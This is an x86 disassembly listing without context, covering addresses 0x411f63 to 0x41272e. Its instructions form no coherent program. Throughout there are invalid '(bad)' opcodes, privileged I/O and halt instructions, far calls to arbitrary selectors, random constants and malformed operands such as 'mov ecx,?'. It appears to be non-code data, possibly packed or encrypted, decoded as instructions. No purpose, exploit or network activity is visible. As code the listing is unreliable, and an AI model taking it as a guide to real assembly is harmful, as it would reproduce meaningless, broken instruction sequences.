  411f63:	jl     0x411f0a
  411f65:	cmp    eax,DWORD PTR [esi+ebx*2+0xa3bdf31]
  411f6c:	(bad)  
  411f6d:	jo     0x411f58
  411f6f:	or     eax,0x3694fcb2
  411f74:	add    eax,0x383a5152
  411f79:	ins    DWORD PTR es:[edi],dx
  411f7a:	dec    edx
  411f7b:	mov    ch,0xf3
  411f7d:	xlat   BYTE PTR ds:[ebx]
  411f7e:	aad    0x17
  411f80:	pop    edi
  411f81:	(bad)  
  411f82:	clc    
  411f83:	pop    esp
  411f84:	je     0x411f2a
  411f86:	add    dl,BYTE PTR [esi-0x4d]
  411f89:	cwde   
  411f8a:	enter  0x3123,0xbc
  411f8e:	(bad)  
  411f8f:	loopne 0x411f2f
  411f91:	out    dx,al
  411f92:	push   ss
  411f93:	fdivr  QWORD PTR [edx+0xf28aec7]
  411f99:	sub    BYTE PTR [edx-0x5ad8e52c],dh
  411f9f:	fcomip st,st(5)
  411fa1:	lods   al,BYTE PTR ds:[esi]
  411fa2:	pop    edx
  411fa3:	and    DWORD PTR [edx],0xb2ae0867
  411fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411faa:	js     0x411fac
  411fac:	or     DWORD PTR [esi],ebx
  411fae:	fiadd  DWORD PTR [edx]
  411fb0:	xchg   ebx,eax
  411fb1:	(bad)  
  411fb2:	push   edx
  411fb3:	dec    esp
  411fb4:	cmp    edx,DWORD PTR [eax]
  411fb6:	adc    al,0xa8
  411fb8:	xor    dl,cl
  411fba:	adc    ebx,esp
  411fbc:	jecxz  0x411f74
  411fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fbf:	pop    es
  411fc0:	daa    
  411fc1:	adc    dh,BYTE PTR [ebx+0x10]
  411fc4:	lahf   
  411fc5:	scas   al,BYTE PTR es:[edi]
  411fc6:	mov    esi,0xdfbe528
  411fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fcc:	int3   
  411fcd:	mov    edx,0x9f5606ea
  411fd2:	fs inc ebx
  411fd4:	dec    ebp
  411fd5:	mov    ss,esi
  411fd7:	loop   0x411fd5
  411fd9:	push   ebp
  411fda:	sub    DWORD PTR ds:0x102d4de6,0xffffffd1
  411fe1:	ja     0x411f69
  411fe3:	call   0x7d42:0xc5716c18
  411fea:	jmp    DWORD PTR [esp+ecx*1]
  411fed:	shl    DWORD PTR [esi+0x44],0x60
  411ff1:	xor    ah,bl
  411ff3:	push   esi
  411ff4:	clc    
  411ff5:	not    DWORD PTR [ebx+0x259030ac]
  411ffb:	shr    BYTE PTR [eax],1
  411ffd:	call   0xeabdd7f1
  412002:	add    al,0xce
  412004:	fidiv  WORD PTR [edx+0x5454a839]
  41200a:	sub    ebp,DWORD PTR [ebx+ebp*2]
  41200d:	mov    al,ah
  41200f:	stos   DWORD PTR es:[edi],eax
  412010:	push   ecx
  412011:	pop    esp
  412012:	cwde   
  412013:	mov    dl,0x7b
  412015:	mov    ecx,?
  412017:	pop    esi
  412018:	xor    ecx,DWORD PTR [edi]
  41201a:	inc    edx
  41201b:	test   DWORD PTR [edx-0x16],edx
  41201e:	mov    dh,bh
  412020:	mov    ebp,0xe374889d
  412025:	leave  
  412026:	iret   
  412027:	add    ebx,DWORD PTR [edi+edx*8]
  41202a:	pop    eax
  41202b:	ins    DWORD PTR es:[edi],dx
  41202c:	xchg   edi,eax
  41202d:	cld    
  41202e:	jb     0x412023
  412030:	leave  
  412031:	xor    al,bh
  412033:	jge    0x412019
  412035:	inc    edx
  412036:	jecxz  0x41207d
  412038:	iret   
  412039:	push   ecx
  41203a:	mov    al,0xca
  41203c:	clc    
  41203d:	(bad)  
  41203e:	xlat   BYTE PTR ds:[ebx]
  41203f:	adc    DWORD PTR [ecx],ebx
  412041:	js     0x412040
  412043:	mov    bh,0x92
  412045:	and    esi,DWORD PTR [ebp+0x2e3556ad]
  41204b:	or     eax,0x5047fa7f
  412050:	aad    0xc8
  412052:	ror    BYTE PTR [ebx+0xb],cl
  412055:	and    bh,dl
  412057:	fild   QWORD PTR [esi-0x5b]
  41205a:	stos   DWORD PTR es:[edi],eax
  41205b:	or     al,0xa5
  41205d:	mov    edi,0xd695c75f
  412062:	sub    eax,0x648c8a02
  412067:	sbb    BYTE PTR [eax],bl
  412069:	out    0x28,al
  41206b:	xor    eax,0xc1c55147
  412070:	das    
  412071:	ins    BYTE PTR es:[edi],dx
  412072:	dec    edi
  412073:	xor    dh,BYTE PTR [edi+0x72]
  412076:	in     eax,0xeb
  412078:	inc    eax
  412079:	fs adc eax,0x1fc70dda
  41207f:	mov    ebx,0x51e7ada8
  412084:	jmp    0x4120a9
  412086:	aad    0xe
  412088:	dec    ebp
  412089:	call   0xc218:0x115335f3
  412090:	sub    al,0xfc
  412092:	gs ins DWORD PTR es:[edi],dx
  412094:	xor    ecx,DWORD PTR [ecx+0x44275405]
  41209a:	xchg   BYTE PTR [eax+0x47e82f96],dh
  4120a0:	adc    ebp,ebx
  4120a2:	jns    0x4120d1
  4120a4:	test   al,0xf6
  4120a6:	sar    DWORD PTR [edx+0x1ddb18b0],cl
  4120ac:	lods   al,BYTE PTR ds:[esi]
  4120ad:	loopne 0x412085
  4120af:	les    esp,FWORD PTR [ebx]
  4120b1:	pop    ds
  4120b2:	ret    
  4120b3:	jle    0x412078
  4120b5:	loop   0x4120d1
  4120b7:	(bad)  
  4120b8:	std    
  4120b9:	out    0x8b,al
  4120bb:	test   esp,0x5f69e76d
  4120c1:	sub    al,0xee
  4120c3:	cmp    edx,DWORD PTR [edx+eiz*8]
  4120c6:	adc    esi,DWORD PTR ds:[ebx]
  4120c9:	add    eax,0x2967508b
  4120ce:	loop   0x412136
  4120d0:	or     ebp,DWORD PTR [ebp+0x51]
  4120d3:	fiadd  DWORD PTR [edx]
  4120d5:	xchg   DWORD PTR ds:0x5b6222a2,eax
  4120db:	mov    edi,0x5b80fa6d
  4120e0:	jp     0x41210b
  4120e2:	add    DWORD PTR [ebx],eax
  4120e4:	call   0x3f34:0xa6c97460
  4120eb:	xor    ah,cl
  4120ed:	xchg   ebp,eax
  4120ee:	test   eax,0xfe0ff14d
  4120f3:	aaa    
  4120f4:	retf   0x2fa2
  4120f7:	into   
  4120f8:	loope  0x412099
  4120fa:	popf   
  4120fb:	sub    esp,0x4c
  4120fe:	pop    edx
  4120ff:	iret   
  412100:	in     eax,0x3e
  412102:	xchg   edi,eax
  412103:	jecxz  0x4120ba
  412105:	mov    bl,0xc4
  412107:	sti    
  412108:	mov    ds,WORD PTR [edx-0x67]
  41210b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41210c:	into   
  41210d:	push   esi
  41210e:	mov    cl,BYTE PTR [edi+0x31]
  412111:	fcmovb st,st(2)
  412113:	test   eax,0xcbe6c0ab
  412118:	mov    ds:0x6c503ac1,al
  41211d:	mov    cl,0xdf
  41211f:	and    eax,DWORD PTR [edx]
  412121:	in     eax,0x6a
  412123:	pop    eax
  412124:	cs repnz int 0xd3
  412128:	cmp    BYTE PTR [edx-0x19f0f4d0],0xc9
  41212f:	sahf   
  412130:	inc    eax
  412131:	xchg   edi,eax
  412132:	jne    0x41214f
  412134:	jl     0x412194
  412136:	pop    edx
  412137:	ins    BYTE PTR es:[edi],dx
  412138:	repnz push eax
  41213a:	xor    dl,ch
  41213c:	ret    
  41213d:	mov    edi,0xd7b003a1
  412142:	jmp    0x41210a
  412144:	add    bh,BYTE PTR [ebx+0x3ab35d5b]
  41214a:	xchg   ecx,eax
  41214b:	sub    esi,DWORD PTR [eax]
  41214d:	(bad)  
  41214f:	cs adc dh,bh
  412152:	jno    0x4120e7
  412154:	push   ebx
  412155:	pop    ecx
  412156:	loopne 0x4121be
  412158:	add    al,0x5c
  41215a:	jo     0x4120ff
  41215c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41215d:	or     BYTE PTR [eax],0x24
  412160:	jp     0x412192
  412162:	push   ss
  412163:	pop    edx
  412164:	rcl    BYTE PTR ds:0xd1148c03,0x46
  41216b:	int    0x2
  41216d:	xor    BYTE PTR [eax],0x17
  412170:	dec    ebp
  412171:	arpl   WORD PTR [eax+0x7e9c2014],di
  412177:	push   esi
  412178:	mov    ch,BYTE PTR [ecx]
  41217a:	cmp    BYTE PTR [esi+0x67f16c28],bh
  412180:	jnp    0x4121d9
  412182:	and    al,0x16
  412184:	push   ds
  412185:	mov    ebp,0xa8741d9d
  41218a:	xor    eax,0xd9ad56a8
  41218f:	push   ds
  412190:	int    0x8f
  412192:	loope  0x4121df
  412194:	sbb    ecx,DWORD PTR [edx-0x7e]
  412197:	inc    ebx
  412198:	xchg   esp,eax
  412199:	or     ebx,DWORD PTR [edi]
  41219b:	fdiv   st(5),st
  41219d:	mov    WORD PTR [ebp+0x5a],?
  4121a0:	push   0x70aab0ac
  4121a5:	mov    ds:0xd68acfb4,eax
  4121aa:	xor    edi,DWORD PTR [ebx+0x7379e2fd]
  4121b0:	div    BYTE PTR [esi-0x4aa74195]
  4121b6:	sub    BYTE PTR [ebx+0x1],ch
  4121b9:	and    eax,0x59bc45
  4121be:	aam    0x66
  4121c0:	adc    DWORD PTR [edi+0x2de2ffa6],ecx
  4121c6:	xlat   BYTE PTR ds:[ebx]
  4121c7:	call   0xda20:0xc7c22073
  4121ce:	es dec edx
  4121d0:	call   0xb8e1e1a6
  4121d5:	pop    es
  4121d6:	sar    eax,cl
  4121d8:	test   esp,0xe93ba8f0
  4121de:	cmp    ebx,DWORD PTR [eax]
  4121e0:	and    BYTE PTR [ebp+0x45],bh
  4121e3:	dec    edi
  4121e4:	shl    DWORD PTR [ebx],1
  4121e6:	cmp    al,0x68
  4121e8:	adc    eax,0xc37a3843
  4121ed:	cmp    ebp,ebp
  4121ef:	outs   dx,DWORD PTR ds:[esi]
  4121f0:	mov    ds,WORD PTR [esp+ebx*2-0xf]
  4121f4:	cs out dx,al
  4121f6:	xor    cl,dh
  4121f8:	inc    edx
  4121f9:	cld    
  4121fa:	ror    BYTE PTR [ecx-0x75583050],1
  412200:	imul   edi,DWORD PTR ds:0x5f2fd1b0,0x95b25dcd
  41220a:	in     eax,dx
  41220b:	lods   al,BYTE PTR ds:[esi]
  41220c:	stc    
  41220d:	adc    al,0x17
  41220f:	sahf   
  412210:	mov    dl,BYTE PTR [eax]
  412212:	adc    eax,eax
  412214:	outs   dx,DWORD PTR ds:[esi]
  412215:	cwde   
  412216:	xchg   esi,eax
  412217:	inc    edi
  412218:	push   ecx
  412219:	push   es
  41221a:	ds push es
  41221c:	dec    edx
  41221d:	pop    ecx
  41221e:	pop    edx
  41221f:	(bad)  
  412220:	jnp    0x4121c8
  412222:	out    0xd0,al
  412224:	idiv   esi
  412226:	scas   al,BYTE PTR es:[edi]
  412227:	out    0xa6,al
  412229:	ja     0x412253
  41222b:	inc    eax
  41222c:	retf   0x5c34
  41222f:	sbb    dl,ah
  412231:	push   edx
  412232:	xlat   BYTE PTR ds:[ebx]
  412233:	retf   0x40aa
  412236:	ret    
  412237:	jp     0x41221a
  412239:	inc    ebx
  41223a:	pop    ss
  41223b:	(bad)  
  41223d:	and    BYTE PTR [bx+si+0x77],ah
  412241:	mov    cl,0x4d
  412243:	push   0x2768fc92
  412248:	std    
  412249:	jnp    0x412249
  41224b:	call   0xecd722a6
  412250:	fiadd  WORD PTR [edi+0x427a33fe]
  412256:	ins    DWORD PTR es:[edi],dx
  412257:	into   
  412258:	xor    DWORD PTR [edi+0x37],ecx
  41225b:	shl    BYTE PTR [edi],cl
  41225d:	add    eax,0x162f4202
  412262:	test   eax,0xaf6cb95d
  412267:	jp     0x41222c
  412269:	mov    eax,ds:0xbbbcdcc9
  41226e:	clc    
  41226f:	jg     0x412280
  412271:	stc    
  412272:	add    ch,ch
  412274:	pop    ds
  412275:	(bad)  
  412276:	cmp    DWORD PTR [eax-0x2b0aa5d9],ebx
  41227c:	iret   
  41227d:	(bad)  
  41227e:	stc    
  41227f:	add    ch,BYTE PTR [ebp-0xe36b6c]
  412285:	sbb    DWORD PTR [eax],esi
  412287:	iret   
  412288:	add    DWORD PTR [eax-0x6f],eax
  41228b:	in     eax,0xa3
  41228d:	test   BYTE PTR [edi-0x254938a8],ch
  412293:	packssdw mm1,mm0
  412296:	xchg   edi,eax
  412297:	dec    esi
  412298:	and    ecx,DWORD PTR [esi-0x35]
  41229b:	xlat   BYTE PTR ds:[ebx]
  41229c:	sbb    eax,esp
  41229e:	xchg   esi,eax
  41229f:	adc    BYTE PTR [edi-0x6],ch
  4122a2:	push   edi
  4122a3:	mov    ecx,0xcc2c35c1
  4122a8:	test   eax,0x69c730ae
  4122ad:	cli    
  4122ae:	inc    ebp
  4122af:	adc    dl,dl
  4122b1:	jno    0x412311
  4122b3:	xchg   ebp,eax
  4122b4:	cmp    dl,dh
  4122b6:	or     DWORD PTR [eax],0xffffffff
  4122b9:	stos   BYTE PTR es:[edi],al
  4122ba:	jnp    0x412256
  4122bc:	or     ah,BYTE PTR [eax]
  4122be:	not    ecx
  4122c0:	addr16 add al,0xb9
  4122c3:	mov    dh,0x8
  4122c5:	or     DWORD PTR [esi+0x7f],esp
  4122c8:	mov    dl,0x2f
  4122ca:	mov    bh,0x38
  4122cc:	jnp    0x4122cf
  4122ce:	adc    al,0xc2
  4122d0:	dec    ecx
  4122d1:	sbb    edx,ebp
  4122d3:	xchg   ebp,eax
  4122d4:	addr16 mov ch,0xd0
  4122d7:	dec    edi
  4122d8:	aam    0x75
  4122da:	fnstenv [eax+0xd]
  4122dd:	dec    ecx
  4122de:	lods   eax,DWORD PTR ds:[esi]
  4122df:	lods   al,BYTE PTR ds:[esi]
  4122e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e1:	retf   
  4122e2:	cmp    ecx,ebp
  4122e4:	pop    ss
  4122e5:	jmp    0xca3e:0xac513bc0
  4122ec:	push   edx
  4122ed:	mov    BYTE PTR [eax-0x4c4051f1],0xa9
  4122f4:	push   ecx
  4122f5:	cmp    al,0x3f
  4122f7:	pushf  
  4122f8:	xchg   ecx,eax
  4122f9:	lahf   
  4122fa:	je     0x4122ff
  4122fc:	xchg   ebp,eax
  4122fd:	int3   
  4122fe:	mov    edx,0x1fbb80c3
  412303:	stos   DWORD PTR es:[edi],eax
  412304:	test   BYTE PTR [esi+0x51ad05d6],dl
  41230a:	adc    eax,0x85df9a57
  41230f:	or     dh,BYTE PTR [ebp+0x5353e189]
  412315:	and    cl,BYTE PTR [edx]
  412317:	in     al,0x9b
  412319:	out    0x80,al
  41231b:	push   esp
  41231c:	lods   al,BYTE PTR ss:[esi]
  41231e:	ror    DWORD PTR [ebp-0xab57388],1
  412324:	test   ebx,esi
  412326:	ins    DWORD PTR es:[edi],dx
  412327:	pushf  
  412328:	popa   
  412329:	adc    cl,BYTE PTR [esi-0x67]
  41232c:	and    eax,0xb256ab7e
  412331:	xchg   ah,dh
  412333:	adc    al,0x34
  412335:	jnp    0x412394
  412337:	inc    ebx
  412338:	cmp    esp,0x2a934d69
  41233e:	mov    bh,0x1e
  412340:	loopne 0x412301
  412342:	stc    
  412343:	ins    BYTE PTR es:[edi],dx
  412344:	and    eax,0xe896dd6c
  412349:	pusha  
  41234a:	pop    es
  41234b:	ret    
  41234c:	pop    ecx
  41234d:	and    eax,0xf5862989
  412352:	std    
  412353:	dec    edi
  412354:	xchg   ecx,eax
  412355:	cmp    dh,BYTE PTR [ebp+eiz*8+0x66]
  412359:	mov    esi,0x7f727443
  41235e:	xchg   ebx,eax
  41235f:	jecxz  0x412378
  412361:	pushf  
  412362:	sub    BYTE PTR [ecx],ch
  412364:	or     eax,0xd96444ac
  412369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41236a:	push   ebx
  41236b:	or     BYTE PTR ds:[edi+0x67d51b71],al
  412372:	inc    eax
  412373:	mov    ch,0x12
  412375:	mov    edi,0x738eb4ab
  41237a:	mov    esp,DWORD PTR [ebp+0x70c11e4c]
  412380:	fst    QWORD PTR [eax+ecx*8+0x27]
  412384:	dec    esp
  412385:	push   edi
  412386:	and    bl,BYTE PTR [eax-0x7]
  412389:	call   0x271f:0xe427daa9
  412390:	aam    0x39
  412392:	cli    
  412393:	or     eax,0x7f4a09d0
  412398:	mov    bl,0xe6
  41239a:	cmp    al,0x65
  41239c:	xor    eax,0x6b22e291
  4123a1:	test   BYTE PTR [ebx+0x58],bh
  4123a4:	int3   
  4123a5:	add    eax,0xe68a1fe0
  4123aa:	jmp    0x5d091c5f
  4123af:	push   ecx
  4123b0:	lods   al,BYTE PTR ds:[esi]
  4123b1:	cmp    BYTE PTR [ebx-0x45],bl
  4123b4:	sbb    eax,0xe96a9514
  4123b9:	mov    ecx,0x5902845a
  4123be:	jo     0x4123d3
  4123c0:	push   esp
  4123c1:	lock pop edi
  4123c3:	neg    BYTE PTR [ecx+0xe]
  4123c6:	pop    ebp
  4123c7:	inc    eax
  4123c8:	dec    esp
  4123c9:	sar    DWORD PTR [ebx],1
  4123cb:	mov    al,0x6d
  4123cd:	enter  0x4242,0x33
  4123d1:	daa    
  4123d2:	fs gs dec ecx
  4123d5:	ss mov bh,0xc0
  4123d8:	fdiv   st,st(5)
  4123da:	jo     0x41237a
  4123dc:	mov    es,ebx
  4123de:	(bad)  
  4123e0:	inc    edx
  4123e1:	lahf   
  4123e2:	pusha  
  4123e3:	adc    DWORD PTR ds:0xac505b7,edi
  4123e9:	pop    eax
  4123ea:	pop    ds
  4123eb:	in     eax,0xb6
  4123ed:	mov    ds:0xb6b9fc6e,eax
  4123f2:	push   ds
  4123f3:	sub    DWORD PTR [ebx+0x77],ecx
  4123f6:	clc    
  4123f7:	in     eax,dx
  4123f8:	sub    al,0x4f
  4123fa:	test   DWORD PTR [esi+0x55054e34],edi
  412400:	add    BYTE PTR [esi],bh
  412402:	int3   
  412403:	push   edx
  412404:	outs   dx,DWORD PTR ds:[esi]
  412405:	loopne 0x41240d
  412407:	punpckhdq mm0,QWORD PTR [esi+0x29f81aae]
  41240e:	add    edi,DWORD PTR ds:0xc4ea00cd
  412414:	push   cs
  412415:	dec    edi
  412416:	jnp    0x4123ff
  412418:	int    0xbc
  41241a:	scas   eax,DWORD PTR es:[edi]
  41241b:	test   eax,0x76248529
  412420:	dec    eax
  412421:	into   
  412422:	into   
  412423:	inc    esi
  412424:	cmp    BYTE PTR [ecx+0x716fd752],ch
  41242a:	gs pop esp
  41242c:	ss (bad) 
  41242e:	cmp    BYTE PTR [ebx+0x6],dh
  412431:	(bad)  
  412432:	sti    
  412433:	lahf   
  412434:	sti    
  412435:	and    eax,0x411bb0a
  41243a:	inc    ebp
  41243b:	arpl   WORD PTR [edx-0x5df1c8b5],ax
  412441:	adc    bl,bl
  412443:	ret    0xa73e
  412446:	test   DWORD PTR [eax-0x6450a0d9],eax
  41244c:	inc    edi
  41244d:	mov    ebp,DWORD PTR ds:[ebp+0x28]
  412451:	cmp    BYTE PTR [edx],dh
  412453:	ja     0x4124ba
  412455:	add    al,ah
  412457:	sbb    dh,BYTE PTR [ebp+0x1997e87f]
  41245d:	jns    0x412475
  41245f:	fiadd  WORD PTR cs:[eax]
  412462:	jmp    0x21367978
  412467:	fmul   QWORD PTR [ecx+eiz*8]
  41246a:	lahf   
  41246b:	jmp    FWORD PTR [ecx]
  41246d:	add    BYTE PTR [edx-0x58],ah
  412470:	dec    eax
  412471:	std    
  412472:	push   0x4b665dc3
  412477:	dec    esi
  412478:	dec    eax
  412479:	inc    edi
  41247a:	lahf   
  41247b:	mov    DWORD PTR [ebp-0x5e],eax
  41247e:	cmc    
  41247f:	dec    ebp
  412480:	mov    dl,0x8c
  412482:	fwait
  412483:	push   edi
  412484:	or     eax,0xff46d726
  412489:	mov    esi,0x6dc76bc9
  41248e:	and    DWORD PTR [edx+eax*1+0x31],esi
  412492:	xor    al,0xce
  412494:	test   BYTE PTR [edi+0x6088659e],cl
  41249a:	xor    BYTE PTR [ebp-0x38],cl
  41249d:	and    ebp,DWORD PTR [edi+0x6f5b1f0e]
  4124a3:	pop    esp
  4124a4:	mov    ds:0xdda5132e,al
  4124a9:	xchg   esp,eax
  4124aa:	call   0x465d:0xd0c390f6
  4124b1:	out    0x84,eax
  4124b3:	and    DWORD PTR [bx+si-0x58d5],edx
  4124b8:	or     DWORD PTR [edi+0x52ab21a8],esi
  4124be:	dec    esi
  4124bf:	cld    
  4124c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c1:	fwait
  4124c2:	outs   dx,DWORD PTR ds:[esi]
  4124c3:	sub    BYTE PTR [edi+0x7a],bh
  4124c6:	(bad)  
  4124c7:	test   ch,0x63
  4124ca:	or     al,BYTE PTR ds:0x366faa56
  4124d0:	adc    eax,DWORD PTR [esi-0x5c882ac7]
  4124d6:	adc    DWORD PTR [ebp+0x11c8bda9],eax
  4124dc:	mov    bh,0xe2
  4124de:	imul   ecx,DWORD PTR [edi+ebp*2-0xde6dab7],0xd468dca9
  4124e9:	sbb    al,0xb5
  4124eb:	inc    ebx
  4124ec:	stos   BYTE PTR es:[edi],al
  4124ed:	jle    0x41248c
  4124ef:	int3   
  4124f0:	repz and eax,DWORD PTR [ebp+esi*8+0x17]
  4124f5:	jle    0x41253d
  4124f7:	sbb    DWORD PTR ds:0x9dab5e29,esi
  4124fd:	ins    BYTE PTR es:[edi],dx
  4124fe:	or     esi,DWORD PTR [ebp-0x3a9a72a9]
  412504:	clc    
  412505:	sbb    eax,0x74536cb5
  41250a:	jg     0x4124a9
  41250c:	fadd   QWORD PTR [esi-0x25483297]
  412512:	dec    esi
  412513:	popf   
  412514:	cwde   
  412515:	pop    edx
  412516:	xlat   BYTE PTR ds:[ebx]
  412517:	mov    ds:0xc11a2dd5,eax
  41251c:	stos   DWORD PTR es:[edi],eax
  41251d:	xor    esi,ebx
  41251f:	push   ss
  412520:	stos   BYTE PTR es:[edi],al
  412521:	jne    0x412539
  412523:	in     al,0xeb
  412525:	sbb    bl,BYTE PTR [edx-0x28]
  412528:	xchg   ecx,eax
  412529:	xchg   edx,eax
  41252a:	push   es
  41252b:	or     ah,al
  41252d:	test   BYTE PTR [ecx+0x46],ch
  412530:	push   eax
  412531:	iret   
  412532:	jmp    0xbf1ecbfa
  412537:	dec    esi
  412538:	mov    ah,0xc3
  41253a:	call   0x3438:0x7d3ec137
  412541:	dec    edi
  412542:	mov    dh,BYTE PTR [eax+0x29]
  412545:	cmp    DWORD PTR [ebp-0x5e71d7c4],edi
  41254b:	jge    0x4124fe
  41254d:	xchg   ebx,eax
  41254e:	dec    edi
  41254f:	loop   0x4125ab
  412551:	imul   ebp,DWORD PTR [ecx+0x28],0xbaf006ed
  412558:	(bad)  
  412559:	les    esi,FWORD PTR [ebp-0x7a5769e2]
  41255f:	adc    ebx,DWORD PTR [ebx+ebx*4+0x25]
  412563:	loopne 0x412522
  412565:	sti    
  412566:	je     0x412536
  412568:	or     ebp,DWORD PTR [eax-0x1bc612f2]
  41256e:	pushf  
  41256f:	push   ebp
  412570:	or     DWORD PTR ds:0xad2f417c,ebx
  412576:	lds    esi,FWORD PTR [edx*1+0xc6ebc02]
  41257d:	mov    ebx,edi
  41257f:	loope  0x41254e
  412581:	das    
  412582:	jle    0x4125e8
  412584:	test   BYTE PTR [eax+0x74],dl
  412587:	push   0x1e
  412589:	rcl    BYTE PTR [edx+edi*8],cl
  41258c:	add    al,0x24
  41258e:	cmp    al,0x22
  412590:	and    eax,0x582e2d9c
  412595:	aad    0x6
  412597:	or     edx,DWORD PTR [edx-0x42397d54]
  41259d:	adc    al,0xef
  41259f:	in     eax,dx
  4125a0:	aam    0x58
  4125a2:	xor    eax,0xf009f595
  4125a7:	cmp    al,0x5f
  4125a9:	loopne 0x4125c6
  4125ab:	and    cl,0x42
  4125ae:	jp     0x412554
  4125b0:	push   edx
  4125b1:	bound  ecx,QWORD PTR [esi+0x39]
  4125b4:	push   cs
  4125b5:	mov    esp,0x89571376
  4125ba:	dec    ebx
  4125bb:	shl    DWORD PTR [ebx+0x49],cl
  4125be:	mov    esp,0x5413707f
  4125c3:	out    0x72,eax
  4125c5:	(bad)  
  4125c7:	xor    bh,BYTE PTR [ecx-0x77655af3]
  4125cd:	xchg   DWORD PTR [ebp+0x7e],ebp
  4125d0:	pop    ecx
  4125d1:	inc    eax
  4125d2:	(bad)  
  4125d4:	fidivr DWORD PTR [ebx]
  4125d6:	repz mov edi,0x5d70ea22
  4125dc:	int    0xf2
  4125de:	xchg   esp,eax
  4125df:	mov    ah,0xc1
  4125e1:	xchg   esi,eax
  4125e2:	adc    edi,edx
  4125e4:	scas   al,BYTE PTR es:[edi]
  4125e5:	repz inc esp
  4125e7:	loope  0x4125b2
  4125e9:	and    BYTE PTR [eax+eax*8+0x7b],al
  4125ed:	icebp  
  4125ee:	out    0x9e,al
  4125f0:	push   esp
  4125f1:	sbb    ebx,DWORD PTR [ebp+0x16]
  4125f4:	mov    edx,0x687a3596
  4125f9:	or     eax,DWORD PTR [ebp-0x1f3fa4fb]
  4125ff:	scas   eax,DWORD PTR es:[edi]
  412600:	jle    0x4125b6
  412602:	mov    WORD PTR [edi+0x3c],ss
  412605:	push   esi
  412606:	mov    edx,0x8d3dc5d9
  41260b:	outs   dx,BYTE PTR ds:[esi]
  41260c:	aaa    
  41260d:	leave  
  41260e:	mov    ds:0x33f20372,al
  412613:	sub    DWORD PTR [edi-0x59],ebx
  412616:	lds    edi,FWORD PTR [ebx+0x73]
  412619:	jbe    0x412680
  41261b:	push   ecx
  41261c:	push   ecx
  41261d:	ret    0x6aa2
  412620:	add    DWORD PTR [ecx+esi*1-0x84e39b9],ebx
  412627:	mov    eax,0xe150383d
  41262c:	cld    
  41262d:	and    eax,DWORD PTR [edi+0x66dd05cc]
  412633:	cmp    al,0x1c
  412635:	pop    edx
  412636:	test   DWORD PTR [edi-0x64],edi
  412639:	(bad)  
  41263a:	int    0x5c
  41263c:	mov    ds:0x197599d,al
  412641:	inc    esi
  412642:	sbb    BYTE PTR [ecx+0x1c],0x23
  412646:	jbe    0x412647
  412648:	pop    esi
  412649:	xchg   edx,eax
  41264a:	ficomp DWORD PTR [edx]
  41264c:	sti    
  41264d:	dec    eax
  41264e:	sar    DWORD PTR [ecx],0x68
  412651:	sti    
  412652:	pop    edx
  412653:	adc    eax,0x9b34ad3a
  412658:	pop    ds
  412659:	xchg   edx,eax
  41265a:	lock aad 0x38
  41265d:	daa    
  41265e:	jo     0x412679
  412660:	ins    DWORD PTR es:[edi],dx
  412661:	push   ecx
  412662:	mov    BYTE PTR [ebp-0x65],cl
  412665:	and    edx,DWORD PTR [edx+ebp*4+0x6b2e7b3f]
  41266c:	push   esp
  41266d:	jge    0x41268f
  41266f:	hlt    
  412670:	dec    esp
  412671:	out    0x4b,eax
  412673:	ins    BYTE PTR es:[edi],dx
  412674:	add    eax,0xd9e2d0fd
  412679:	(bad)  
  41267a:	std    
  41267b:	mov    eax,DWORD PTR [ebx-0x39]
  41267e:	mov    dh,0x26
  412680:	xor    eax,0x1715d1b5
  412685:	inc    ebx
  412686:	scas   eax,DWORD PTR es:[edi]
  412687:	js     0x41260b
  412689:	mov    DWORD PTR [ebx-0x3868beb],esp
  41268f:	scas   al,BYTE PTR es:[edi]
  412690:	test   al,0xaf
  412692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412693:	shl    DWORD PTR [ebx-0x4323ec72],cl
  412699:	push   ds
  41269a:	xor    eax,0x338ca75e
  41269f:	test   al,0x25
  4126a1:	and    DWORD PTR [ebx+0x11],ecx
  4126a4:	outs   dx,DWORD PTR ds:[esi]
  4126a5:	aaa    
  4126a6:	and    eax,0x52bd572b
  4126ab:	dec    DWORD PTR [edi]
  4126ad:	jne    0x4126ff
  4126af:	out    0x18,al
  4126b1:	arpl   WORD PTR [eax],sp
  4126b3:	mov    eax,ds:0x5f8de60e
  4126b8:	ret    
  4126b9:	ss pop edx
  4126bb:	test   DWORD PTR [eax],eax
  4126bd:	pushf  
  4126be:	sbb    al,0x44
  4126c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126c1:	adc    ah,al
  4126c3:	rcl    BYTE PTR [eax+0x54],cl
  4126c6:	data16 test al,0xf1
  4126c9:	xchg   ebx,eax
  4126ca:	cmc    
  4126cb:	in     eax,0xb9
  4126cd:	inc    edi
  4126ce:	add    DWORD PTR [ecx],0xc8dcd0e3
  4126d4:	sbb    edi,DWORD PTR [ecx-0x7cdacb45]
  4126da:	int3   
  4126db:	cmc    
  4126dc:	jne    0x41266e
  4126de:	xchg   edi,eax
  4126df:	mov    ds:0x12613755,eax
  4126e4:	mov    ss,WORD PTR [eax]
  4126e6:	test   al,0x76
  4126e8:	iret   
  4126e9:	rcl    BYTE PTR [ebx+0x21],cl
  4126ec:	add    dh,BYTE PTR [esi-0x29]
  4126ef:	aam    0xe8
  4126f1:	sbb    eax,0x4b7e489
  4126f6:	inc    ebp
  4126f7:	dec    ecx
  4126f8:	mov    BYTE PTR [edx+0x1d4cb289],0x7
  4126ff:	(bad)  
  412700:	jne    0x4126aa
  412702:	mov    ah,0xf0
  412704:	xor    eax,0x87fb53af
  412709:	xor    BYTE PTR [ebx-0x3e],0x61
  41270d:	fdiv   DWORD PTR [esi+0x29af6935]
  412713:	das    
  412714:	retf   
  412715:	or     al,0x34
  412717:	push   ss
  412718:	gs push ebp
  41271a:	mov    bl,0xce
  41271c:	adc    edi,esi
  41271e:	add    al,al
  412720:	mov    ebp,0x4e02c0a1
  412725:	pop    eax
  412726:	(bad)  
  412727:	inc    edx
  412728:	sub    ebx,eax
  41272a:	mov    esi,ecx
  41272c:	pop    es
  41272d:	into   
  41272e:	inc    eax
